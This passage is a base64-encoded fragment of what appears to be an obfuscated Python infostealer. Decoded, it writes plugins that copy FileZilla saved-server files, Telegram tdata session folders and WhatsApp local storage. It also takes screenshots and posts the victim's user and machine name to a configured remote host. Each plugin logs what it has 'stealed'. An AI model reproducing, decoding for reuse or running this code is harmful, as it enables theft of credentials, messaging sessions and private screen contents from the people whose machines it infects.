W5faGV4KDQpfS5qc29uXCcpKScpI2xpbmU6NjkKICAgIF9fT08wT08wME8wTzAwT09PT08gKCdwbHVnaW5zL2ZpbGV6aWxsYS5weScsYiJmcm9tIHBsdWdpbnMgaW1wb3J0IFBsdWdpblxyXG5mcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgaXNkaXIsIGpvaW5cclxuZnJvbSBvcyBpbXBvcnQgbWtkaXIsIHNjYW5kaXJcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSB0b29scyBpbXBvcnQgY29weWZpbGVcclxuXHJcblxyXG5cclxuY2xhc3MgRmlsZXppbGxhKFBsdWdpbik6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuY29uZiA9IGNvbmZcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNkaXIocGF0aCk6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICBzZWFyY2ggPSB7J3JlY2VudHNlcnZlcnMueG1sJywgJ3NpdGVtYW5hZ2VyLnhtbCd9XHJcbiAgICAgICAgZmlsZXMgPSBzZWFyY2guaW50ZXJzZWN0aW9uKGkubmFtZSBmb3IgaSBpbiBzY2FuZGlyKHBhdGgpKVxyXG5cclxuICAgICAgICBpZiBub3QgZmlsZXM6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICByZXNfcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCAnZmlsZXppbGxhJylcclxuICAgICAgICBpZiBub3QgaXNkaXIocmVzX3BhdGgpOlxyXG4gICAgICAgICAgICBta2RpcihyZXNfcGF0aClcclxuICAgICAgICBcclxuICAgICAgICBmb3IgZiBpbiBmaWxlczpcclxuICAgICAgICAgICAgZmlsZW5hbWUgPSBmLnNwbGl0KCcuJylbMF1cclxuICAgICAgICAgICAgZGVzdF9wYXRoID0gam9pbihyZXNfcGF0aCwgZid7ZmlsZW5hbWV9X3t0b2tlbl9oZXgoNCl9LnhtbCcpXHJcbiAgICAgICAgICAgIGF3YWl0IGNvcHlmaWxlKGpvaW4ocGF0aCwgZiksIGRlc3RfcGF0aClcclxuXHJcbiAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidGaWxlemlsbGEgc3RlYWxlZCBmcm9tIHtwYXRofScpIikjbGluZTo3MAogICAgX19PTzBPTzAwTzBPMDBPT09PTyAoJ3BsdWdpbnMvdGVsZWdyYW0ucHknLGInZnJvbSBwbHVnaW5zIGltcG9ydCBQbHVnaW5cclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGlzZGlyLCBqb2luLCBub3JtcGF0aFxyXG5mcm9tIG9zIGltcG9ydCBta2Rpciwgc2NhbmRpclxyXG5mcm9tIHNlY3JldHMgaW1wb3J0IHRva2VuX2hleFxyXG5mcm9tIHRvb2xzIGltcG9ydCBjb3B5ZmlsZSwgY29weXRyZWVcclxuaW1wb3J0IHdpbnJlZ1xyXG5pbXBvcnQgcmVcclxuZnJvbSBwYXRocyBpbXBvcnQgTE9DQUxcclxuaW1wb3J0IHdpbjMyY29tLmNsaWVudFxyXG5pbXBvcnQgcHN1dGlsXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgc3BsaXRcclxuXHJcblxyXG5cclxuY2xhc3MgVGVsZWdyYW0oUGx1Z2luKTpcclxuICAgIFNURUFMRUQgPSBzZXQoKVxyXG5cclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuY29uZiA9IGNvbmZcclxuXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2soc2VsZiwgcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIHBhdGhfID0gbm9ybXBhdGgocGF0aC5sb3dlcigpKVxyXG4gICAgICAgIGlmIHBhdGhfIGluIFRlbGVncmFtLlNURUFMRUQ6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIFRlbGVncmFtLlNURUFMRUQuYWRkKHBhdGhfKVxyXG4gICAgICAgIFxyXG4gICAgICAgIGlmIG5vdCBpc2RpcihwYXRoKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIHRkYXRhX3BhdGggPSBqb2luKHBhdGgsIFwndGRhdGFcJylcclxuICAgICAgICBpZiBub3QgaXNkaXIodGRhdGFfcGF0aCk6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICB0ZWxlZ3JhbV9wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsIFwndGVsZWdyYW1cJylcclxuICAgICAgICBpZiBub3QgaXNkaXIodGVsZWdyYW1fcGF0aCk6XHJcbiAgICAgICAgICAgIG1rZGlyKHRlbGVncmFtX3BhdGgpXHJcblxyXG4gICAgICAgIHJlc19wYXRoID0gam9pbih0ZWxlZ3JhbV9wYXRoLCBmXCd0ZGF0YV97dG9rZW5faGV4KDQpfVwnKVxyXG4gICAgICAgIG1rZGlyKHJlc19wYXRoKVxyXG5cclxuICAgICAgICBibGFja2xpc3QgPSBbXCdkdW1wc1wnLCBcJ2Vtb2ppXCcsIFwndXNlcl9kYXRhXCcsIFwnd29ya2luZ1wnXVxyXG5cclxuICAgICAgICBmb3IgZiBpbiBzY2FuZGlyKHRkYXRhX3BhdGgpOlxyXG4gICAgICAgICAgICBmaWxlX29rID0gVHJ1ZVxyXG4gICAgICAgICAgICBmb3IgaSBpbiBibGFja2xpc3Q6XHJcbiAgICAgICAgICAgICAgICBpZiBpIGluIGYubmFtZTpcclxuICAgICAgICAgICAgICAgICAgICBmaWxlX29rID0gRmFsc2VcclxuICAgICAgICAgICAgICAgICAgICBicmVha1xyXG4gICAgICAgICAgICBcclxuICAgICAgICAgICAgaWYgbm90IGZpbGVfb2s6XHJcbiAgICAgICAgICAgICAgICBjb250aW51ZVxyXG4gICAgICAgICAgICBcclxuICAgICAgICAgICAgZnJvbV9wYXRoID0gam9pbih0ZGF0YV9wYXRoLCBmLm5hbWUpXHJcbiAgICAgICAgICAgIGRlc3RfcGF0aCA9IGpvaW4ocmVzX3BhdGgsIGYubmFtZSlcclxuXHJcbiAgICAgICAgICAgIGZ1bmMgPSBjb3B5ZmlsZSBpZiBmLmlzX2ZpbGUoKSBlbHNlIGNvcHl0cmVlXHJcbiAgICAgICAgICAgIGF3YWl0IGZ1bmMoZnJvbV9wYXRoLCBkZXN0X3BhdGgpXHJcblxyXG4gICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGZcJ1RlbGVncmFtIHN0ZWFsZWQgZnJvbSB7cGF0aH1cJylcclxuXHJcbiAgICBAc3RhdGljbWV0aG9kXHJcbiAgICBkZWYgZ2V0X3JlZ2lzdHJ5X3BhdGgoKTpcclxuICAgICAgICBwYXRoID0gd2lucmVnLkhLRVlfQ0xBU1NFU19ST09UXHJcblxyXG4gICAgICAgIHRnID0gd2lucmVnLk9wZW5LZXlFeChwYXRoLCByInRkZXNrdG9wLnRnXFxcXCIpXHJcbiAgICAgICAgc2hlbGwgPSB3aW5yZWcuT3BlbktleUV4KHRnLCByXCdzaGVsbFxcXFxcJylcclxuICAgICAgICBvcGVuX3JnID0gd2lucmVnLk9wZW5LZXlFeChzaGVsbCwgclwnb3BlblxcXFxcJylcclxuICAgICAgICBrZXkgPSB3aW5yZWcuT3BlbktleUV4KG9wZW5fcmcsIHJcJ2NvbW1hbmRcXFxcXCcpXHJcblxyXG4gICAgICAgIHZhbHVlID0gd2lucmVnLkVudW1WYWx1ZShrZXksIDApXHJcblxyXG4gICAgICAgIHBhdGggPSByZS5maW5kYWxsKHJcJyIoW14iXSopXCcsIHZhbHVlWzFdKVsyXVxyXG4gICAgICAgIHJldHVybiBwYXRoXHJcbiAgICAgICAgXHJcbiAgICBAc3RhdGljbWV0aG9kXHJcbiAgICBkZWYgZ2V0X2xua19wYXRoKCk6XHJcbiAgICAgICAgZGVza3RvcCA9IGpvaW4oTE9DQUwsIFwnZGVza3RvcFwnKVxyXG5cclxuICAgICAgICBmb3IgaXQgaW4gc2NhbmRpcihkZXNrdG9wKTpcclxuICAgICAgICAgICAgaWYgaXQubmFtZS5zcGxpdChcJy5cJylbLTFdID09IFwnbG5rXCcgYW5kIFwndGVsZWdyYW1cJyBpbiBpdC5uYW1lLmxvd2VyKCk6XHJcbiAgICAgICAgICAgICAgICBzaGVsbCA9IHdpbjMyY29tLmNsaWVudC5EaXNwYXRjaCgiV1NjcmlwdC5TaGVsbCIpXHJcbiAgICAgICAgICAgICAgICBzaG9ydGN1dCA9IHNoZWxsLkNyZWF0ZVNob3J0Q3V0KGl0LnBhdGgpXHJcbiAgICAgICAgICAgICAgICBwYXRoID0gc2hvcnRjdXQuVGFyZ2V0cGF0aC5sb3dlcigpLnN0cmlwKFwndGVsZWdyYW0uZXhlXCcpXHJcbiAgICAgICAgICAgICAgICByZXR1cm4gcGF0aFxyXG5cclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBnZXRfdGVsZWdyYW1zKCk6XHJcbiAgICAgICAgZm9yIHByb2MgaW4gcHN1dGlsLnByb2Nlc3NfaXRlcigpOlxyXG4gICAgICAgICAgICBpZiBcJ3RlbGVncmFtXCcgaW4gcHJvYy5uYW1lKCkubG93ZXIoKTpcclxuICAgICAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgICAgICB5aWVsZCBzcGxpdChwcm9jLmV4ZSgpKVswXVxyXG4gICAgICAgICAgICAgICAgZXhjZXB0OlxyXG4gICAgICAgICAgICAgICAgICAgIHBhc3MnKSNsaW5lOjcxCiAgICBfX09PME9PMDBPME8wME9PT09PICgncGx1Z2lucy93aGF0c2FwcC5weScsYiJmcm9tIHBsdWdpbnMgaW1wb3J0IFBsdWdpblxyXG5mcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgaXNkaXIsIGpvaW5cclxuZnJvbSBvcyBpbXBvcnQgbWtkaXIsIHNjYW5kaXJcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSB0b29scyBpbXBvcnQgY29weXRyZWVcclxuXHJcblxyXG5cclxuY2xhc3MgV2hhdHNhcHAoUGx1Z2luKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jb25mID0gY29uZlxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2soc2VsZiwgcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIG5vdCBpc2RpcihwYXRoKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIGZvbGRlciA9IGpvaW4ocGF0aCwgJ2xvY2FsIHN0b3JhZ2UnLCAnbGV2ZWxkYicpXHJcblxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcihmb2xkZXIpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuICAgICAgICBcclxuICAgICAgICB3aGF0c2FwcF9yZXNfZm9sZGVyID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICd3aGF0c2FwcCcpXHJcblxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcih3aGF0c2FwcF9yZXNfZm9sZGVyKTpcclxuICAgICAgICAgICAgbWtkaXIod2hhdHNhcHBfcmVzX2ZvbGRlcilcclxuXHJcbiAgICAgICAgcmVzID0gam9pbih3aGF0c2FwcF9yZXNfZm9sZGVyLCBmJ3doYXRzYXBwX3t0b2tlbl9oZXgoNCl9JylcclxuXHJcbiAgICAgICAgYXdhaXQgY29weXRyZWUoZm9sZGVyLCByZXMpXHJcblxyXG4gICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnV2hhdHNhcHAgc3RlYWxlZCBmcm9tIHtwYXRofScpIikjbGluZTo3MgogICAgX19PTzBPTzAwTzBPMDBPT09PTyAoJ3BsdWdpbnMvRGV0YWlscy5weScsYiJmcm9tIGFzeW5jaW8gaW1wb3J0IGNyZWF0ZV90YXNrXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuaW1wb3J0IG9zXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgam9pblxyXG5pbXBvcnQgcGxhdGZvcm1cclxuZnJvbSBhaW9maWxlcyBpbXBvcnQgb3BlblxyXG5mcm9tIG1zcy53aW5kb3dzIGltcG9ydCBNU1MgYXMgbXNzXHJcbmZyb20gdG9vbHMgaW1wb3J0IG1vdmVcclxuXHJcblxyXG5cclxuY2xhc3MgRGV0YWlscygpOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcblxyXG4gICAgYXN5bmMgZGVmIHRha2Vfc2NyZWVuc2hvdChzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIHdpdGggbXNzKCkgYXMgc2N0OlxyXG4gICAgICAgICAgICBmb3IgZmlsZW5hbWUgaW4gc2N0LnNhdmUoKTpcclxuICAgICAgICAgICAgICAgIGF3YWl0IG1vdmUoZmlsZW5hbWUsIGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCBmaWxlbmFtZSkpXHJcbiAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceGExXHhkMFx4YmFceGQxXHg4MFx4ZDBceGI4XHhkMFx4YmRceGQxXHg4OFx4ZDBceGJlXHhkMVx4ODIge2ZpbGVuYW1lfSBceGQxXHg4MVx4ZDBceGJlXHhkMVx4ODVceGQxXHg4MFx4ZDBceGIwXHhkMFx4YmRceGQwXHhiNVx4ZDBceGJkJylcclxuIFxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgYmdfdGFzayA9IGNyZWF0ZV90YXNrKHNlbGYudGFrZV9zY3JlZW5zaG90KCkpXHJcbiAgICAgICAgdXNlciA9IG9zLmdldGxvZ2luKClcclxuICAgICAgICBwYyA9IHBsYXRmb3JtLm5vZGUoKVxyXG4gICAgICAgIHRhZyA9IHNlbGYuY29uZi50YWdcclxuXHJcbiAgICAgICAgZGF0YSA9IHtcclxuICAgICAgICAgICAgJ2NsaWVudF9pZCc6IHNlbGYuY29uZi5jbGllbnRfaWQsXHJcbiAgICAgICAgICAgICd0YWcnOiB0YWcsXHJcbiAgICAgICAgICAgICd1c2VyX25hbWUnOiB1c2VyLFxyXG4gICAgICAgICAgICAncGNfbmFtZSc6IHBjXHJcbiAgICAgICAgfVxyXG4gICAgICAgIFxyXG4gICAgICAgIHVybCA9IGYne3NlbGYuY29uZi5ob3N0fS9yZWNlaXZlX2RldGFpbHMnXHJcblxyXG4gICAgICAgIHJlc3AgPSBhd2FpdCBzZWxmLmNvbmYuc2Vzc2lvbi5wb3N0KHVybCwganNvbj1kYXRhKVxyXG5cclxuICAgICAgICBhc3luYyB3aXRoIG9wZW4oam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICdkZXRhaWxzLnR4dCcpLCAndycsIGVuY29kaW5nPSd1dGY4JykgYXMgZjpcclxuICAgICAgICAgICAgYXdhaXQgZi53cml0ZShmJ3VzZXIgbmFtZToge3VzZXJ9XFxucGMgbmFtZToge3BjfVxcbnRhZzoge3RhZ30nKVxyXG5cclxuICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceDllXHhkMVx4ODJceGQxXHg4MVx4ZDFceDgyXHhkMVx4ODNceGQwXHhiYSBceGQwXHhiZVx4ZDFceDgyXHhkMFx4YmZceGQxXHg4MFx4ZDBceGIwXHhkMFx4YjJceGQwXHhiYlx4ZDBceGI1XHhkMFx4YmQnKVxyXG5cclxuICAgICAgICBhd2FpdCBiZ190YXNrIikjbGluZTo3MwogICAgX19PTzBPTzAwTzBPMDBPT09PTyAoJ3BsdWdpbnMvRmlsZXppbGxhLnB5JyxiImZyb20gcGx1Z2lucyBpbXBvcnQgUGx1Z2luXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBpc2Rpciwgam9pblxyXG5mcm9tIG9zIGltcG9ydCBta2Rpciwgc2NhbmRpclxyXG5mcm9tIHNlY3JldHMgaW1wb3J0IHRva2VuX2hleFxyXG5mcm9tIHRvb2xzIGltcG9ydCBjb3B5ZmlsZVxyXG5cclxuXHJcblxyXG5jbGFzcyBGaWxlemlsbGEoUGx1Z2luKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jb25mID0gY29uZlxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2soc2VsZiwgcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIG5vdCBpc2RpcihwYXRoKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIHNlYXJjaCA9IHsncmVjZW50c2VydmVycy54bWwnLCAnc2l0ZW1hbmFnZXIueG1sJ31cclxuICAgICAgICBmaWxlcyA9IHNlYXJjaC5pbnRlcnNlY3Rpb24oaS5uYW1lIGZvciBpIGluIHNjYW5kaXIocGF0aCkpXHJcblxyXG4gICAgICAgIGlmIG5vdCBmaWxlczpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIHJlc19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICdmaWxlemlsbGEnKVxyXG4gICAgICAgIGlmIG5vdCBpc2RpcihyZXNfcGF0aCk6XHJcbiAgICAgICAgICAgIG1rZGlyKHJlc19wYXRoKVxyXG4gICAgICAgIFxyXG4gICAgICAgIGZvciBmIGluIGZpbGVzOlxyXG4gICAgICAgICAgICBmaWxlbmFtZSA9IGYuc3BsaXQoJy4nKVswXVxyXG4gICAgICAgICAgICBkZXN0X3BhdGggPSBqb2luKHJlc19wYXRoLCBmJ3tmaWxlbmFtZX1fe3Rva2VuX2hleCg0KX0ueG1sJylcclxuICAgICAgICAgICAgYXdhaXQgY29weWZpbGUoam9pbihwYXRoLCBmKSwgZGVzdF9wYXRoKVxyXG5cclxuICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ0ZpbGV6aWxsYSBzdGVhbGVkIGZyb20ge3BhdGh9JykiKSNsaW5lOjc0CiAgICBfX09PME9PMDBPME8wME9PT09PICgncGx1Z2lucy9UZWxlZ3JhbS5weScsYidmcm9tIHBsdWdpbnMgaW1wb3J0IFBsdWdpblxyXG5mcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgaXNkaXIsIGpvaW4sIG5vcm1wYXRoXHJcbmZyb20gb3MgaW1wb3J0IG1rZGlyLCBzY2FuZGlyXHJcbmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4XHJcbmZyb20gdG9vbHMgaW1wb3J0IGNvcHlmaWxlLCBjb3B5dHJlZVxyXG5pbXBvcnQgd2lucmVnXHJcbmltcG9ydCByZVxyXG5mcm9tIHBhdGhzIGltcG9ydCBMT0NBTFxyXG5pbXBvcnQgd2luMzJjb20uY2xpZW50XHJcbmltcG9ydCBwc3V0aWxcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBzcGxpdFxyXG5cclxuXHJcblxyXG5jbGFzcyBUZWxlZ3JhbShQbHVnaW4pOlxyXG4gICAgU1RFQUxFRCA9IHNldCgpXHJcblxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jb25mID0gY29uZlxyXG5cclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhzZWxmLCBwYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgcGF0aF8gPSBub3JtcGF0aChwYXRoLmxvd2VyKCkpXHJcbiAgICAgICAgaWYgcGF0aF8gaW4gVGVsZWdyYW0uU1RFQUxFRDpcclxuICAgICAgICAgICAgcmV0dXJuXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgVGVsZWdyYW0uU1RFQUxFRC5hZGQocGF0aF8pXHJcbiAgICAgICAgXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHBhdGgpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgdGRhdGFfcGF0aCA9IGpvaW4ocGF0aCwgXCd0ZGF0YVwnKVxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcih0ZGF0YV9wYXRoKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIHRlbGVncmFtX3BhdGggPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgXCd0ZWxlZ3JhbVwnKVxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcih0ZWxlZ3JhbV9wYXRoKTpcclxuICAgICAgICAgICAgbWtkaXIodGVsZWdyYW1fcGF0aClcclxuXHJcbiAgICAgICAgcmVzX3BhdGggPSBqb2luKHRlbGVncmFtX3BhdGgsIGZcJ3RkYXRhX3t0b2tlbl9oZXgoNCl9XCcpXHJcbiAgICAgICAgbWtkaXIocmVzX3BhdGgpXHJcblxyXG4gICAgICAgIGJsYWNrbGlzdCA9IFtcJ2R1bXBzXCcsIFwnZW1vamlcJywgXCd1c2VyX2RhdGFcJywgXCd3b3JraW5nXCddXHJcblxyXG4gICAgICAgIGZvciBmIGluIHNjYW5kaXIodGRhdGFfcGF0aCk6XHJcbiAgICAgICAgICAgIGZpbGVfb2sgPSBUcnVlXHJcbiAgICAgICAgICAgIGZvciBpIGluIGJsYWNrbGlzdDpcclxuICAgICAgICAgICAgICAgIGlmIGkgaW4gZi5uYW1lOlxyXG4gICAgICAgICAgICAgICAgICAgIGZpbGVfb2sgPSBGYWxzZVxyXG4gICAgICAgICAgICAgICAgICAgIGJyZWFrXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgICAgICBpZiBub3QgZmlsZV9vazpcclxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgICAgICBmcm9tX3BhdGggPSBqb2luKHRkYXRhX3BhdGgsIGYubmFtZSlcclxuICAgICAgICAgICAgZGVzdF9wYXRoID0gam9pbihyZXNfcGF0aCwgZi5uYW1lKVxyXG5cclxuICAgICAgICAgICAgZnVuYyA9IGNvcHlmaWxlIGlmIGYuaXNfZmlsZSgpIGVsc2UgY29weXRyZWVcclxuICAgICAgICAgICAgYXdhaXQgZnVuYyhmcm9tX3BhdGgsIGRlc3RfcGF0aClcclxuXHJcbiAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZlwnVGVsZWdyYW0gc3RlYWxlZCBmcm9tIHtwYXRofVwnKVxyXG5cclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBnZXRfcmVnaXN0cnlfcGF0aCgpOlxyXG4gICAgICAgIHBhdGggPSB3aW5yZWcuSEtFWV9DTEFTU0VTX1JPT1RcclxuXHJcbiAgICAgICAgdGcgPSB3aW5yZWcuT3BlbktleUV4KHBhdGgsIHIidGRlc2t0b3AudGdcXFxcIilcclxuICAgICAgICBzaGVsbCA9IHdpbnJlZy5PcGVuS2V5RXgodGcsIHJcJ3NoZWxsXFxcXFwnKVxyXG4gICAgICAgIG9wZW5fcmcgPSB3aW5yZWcuT3BlbktleUV4KHNoZWxsLCByXCdvcGVuXFxcXFwnKVxyXG4gICAgICAgIGtleSA9IHdpbnJlZy5PcGVuS2V5RXgob3Blbl9yZywgclwnY29tbWFuZFxcXFxcJylcclxuXHJcbiAgICAgICAgdmFsdWUgPSB3aW5yZWcuRW51bVZhbHVlKGtleSwgMClcclxuXHJcbiAgICAgICAgcGF0aCA9IHJlLmZpbmRhbGwoclwnIihbXiJdKilcJywgdmFsdWVbMV0pWzJdXHJcbiAgICAgICAgcmV0dXJuIHBhdGhcclxuICAgICAgICBcclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBnZXRfbG5rX3BhdGgoKTpcclxuICAgICAgICBkZXNrdG9wID0gam9pbihMT0NBTCwgXCdkZXNrdG9wXCcpXHJcblxyXG4gICAgICAgIGZvciBpdCBpbiBzY2FuZGlyKGRlc2t0b3ApOlxyXG4gICAgICAgICAgICBpZiBpdC5uYW1lLnNwbGl0KFwnLlwnKVstMV0gPT0gXCdsbmtcJyBhbmQgXCd0ZWxlZ3JhbVwnIGluIGl0Lm5hbWUubG93ZXIoKTpcclxuICAgICAgICAgICAgICAgIHNoZWxsID0gd2luMzJjb20uY2xpZW50LkRpc3BhdGNoKCJXU2NyaXB0LlNoZWxsIilcclxuICAgICAgICAgICAgICAgIHNob3J0Y3V0ID0gc2hlbGwuQ3JlYXRlU2hvcnRDdXQoaXQucGF0aClcclxuICAgICAgICAgICAgICAgIHBhdGggPSBzaG9ydGN1dC5UYXJnZXRwYXRoLmxvd2VyKCkuc3RyaXAoXCd0ZWxlZ3JhbS5leGVcJylcclxuICAgICAgICAgICAgICAgIHJldHVybiBwYXRoXHJcblxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIGdldF90ZWxlZ3JhbXMoKTpcclxuICAgICAgICBmb3IgcHJvYyBpbiBwc3V0aWwucHJvY2Vzc19pdGVyKCk6XHJcbiAgICAgICAgICAgIGlmIFwndGVsZWdyYW1cJyBpbiBwcm9jLm5hbWUoKS5sb3dlcigpOlxyXG4gICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgIHlpZWxkIHNwbGl0KHByb2MuZXhlKCkpWzBdXHJcbiAgICAgICAgICAgICAgICBleGNlcHQ6XHJcbiAgICAgICAgICAgICAgICAgICAgcGFzcycpI2xpbmU6NzUKICAgIF9fT08wT08wME8wTzAwT09PT08gKCdwbHVnaW5zL1doYXRzYXBwLnB5JyxiImZyb20gcGx1Z2lucyBpbXBvcnQgUGx1Z2luXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBpc2Rpciwgam9pblxyXG5mcm9tIG9zIGltcG9ydCBta2Rpciwgc2NhbmRpclxyXG5mcm9tIHNlY3JldHMgaW1wb3J0IHRva2VuX2hleFxyXG5mcm9tIHRvb2xzIGltcG9ydCBjb3B5dHJlZVxyXG5cclxuXHJcblxyXG5jbGFzcyBXaGF0c2FwcChQbHVnaW4pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhzZWxmLCBwYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHBhdGgpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgZm9sZGVyID0gam9pbihwYXRoLCAnbG9jYWwgc3RvcmFnZScsICdsZXZlbGRiJylcclxuXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKGZvbGRlcik6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG4gICAgICAgIFxyXG4gICAgICAgIHdoYXRzYXBwX3Jlc19mb2xkZXIgPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgJ3doYXRzYXBwJylcclxuXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHdoYXRzYXBwX3Jlc19mb2xkZXIpOlxyXG4gICAgICAgICAgICBta2Rpcih3aGF0c2FwcF9yZXNfZm9sZGVyKVxyXG5cclxuICAgICAgICByZXMgPSBqb2luKHdoYXRzYXBwX3Jlc19mb2xkZXIsIGYnd2hhdHNhcHBfe3Rva2VuX2hleCg0KX0nKVxyXG5cclxuICAgICAgICBhd2FpdCBjb3B5dHJlZShmb2xkZXIsIHJlcylcclxuXHJcbiAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidXaGF0c2FwcCBzdGVhbGVkIGZyb20ge3BhdGh9JykiKSNsaW5lOjc2CiAgICBpbXBvcnQgYXN5bmNpbyAjbGluZTo3NwogICAgZnJvbSBhc3luY2lvIGltcG9ydCBjcmVhdGVfdGFzayAjbGluZTo3OAogICAgZnJvbSB0eXBpbmcgaW1wb3J0IExpc3QgI2xpbmU6NzkKICAgIGZyb20gcGF0aF9zZWFyY2ggaW1wb3J0IHNlYXJjaF9wbHVnaW5fcGF0aHMgLHJvb3RfcGF0aHMgI2xpbmU6ODAKICAgIGZyb20gY29uZmlnIGltcG9ydCBDb25maWcgI2xpbmU6ODEKICAgIGZyb20gYWlvaHR0cCBpbXBvcnQgQ2xpZW50U2Vzc2lvbiBhcyBTZXNzaW9uICNsaW5lOjgyCiAgICBpbXBvcnQgc2VjcmV0cyAjbGluZTo4